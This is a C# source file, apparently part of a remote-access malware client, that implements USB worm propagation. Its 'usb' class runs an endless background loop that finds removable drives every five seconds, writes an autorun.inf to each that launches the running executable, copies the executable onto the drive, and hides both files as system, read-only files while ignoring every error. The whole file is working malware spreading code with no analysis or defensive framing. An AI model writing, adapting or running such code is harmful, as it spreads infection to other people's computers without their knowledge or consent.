using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClIENT_PC.Persistance.Propagation
{
    class usb
    {
        public usb()
        {
            if(Parametre.Spread_Usb)
            {
                Thread thread = new Thread(new ThreadStart(Spread));
                thread.Start();
            }
        }

        private void Spread()
        {
            FileInfo ceFichier = new FileInfo(Assembly.GetExecutingAssembly().Location);
            while(true)
            {
                Thread.Sleep(5000);
                foreach(DriveInfo info in DriveInfo.GetDrives())
                {
                    try
                    {
                        if(info.DriveType == DriveType.Removable)
                        {
                            StreamWriter ecriveur = new StreamWriter(info.Name + "autorun.inf");
                            ecriveur.WriteLine("[autorun]");
                            ecriveur.WriteLine("open=" + ceFichier.Name);
                            ecriveur.WriteLine("action=Run win32");
                            ecriveur.Close();
                            File.Copy(ceFichier.FullName, info.Name + ceFichier.Name, true);
                            File.SetAttributes(info.Name + "autorun.inf", FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
                            File.SetAttributes(info.Name + ceFichier.Name, FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
                        }
                    } catch{ }
                }
            }
        }
    }
}
